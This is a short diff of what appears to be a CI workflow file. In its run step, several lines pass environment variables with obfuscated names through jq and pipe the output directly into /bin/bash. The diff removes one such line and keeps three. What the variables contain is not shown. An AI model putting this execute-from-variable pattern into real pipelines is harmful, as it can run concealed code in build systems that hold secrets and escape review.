@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$vq03420" | jq -r .dogso8 | /bin/bash
           echo $dy697 | jq -r .rvde54532 | /bin/bash
-          echo $kjfza3957 | jq -r .qx65 | /bin/bash
           echo $asv371 | jq -r .sf37 | /bin/bash
 
       - name: Archive results
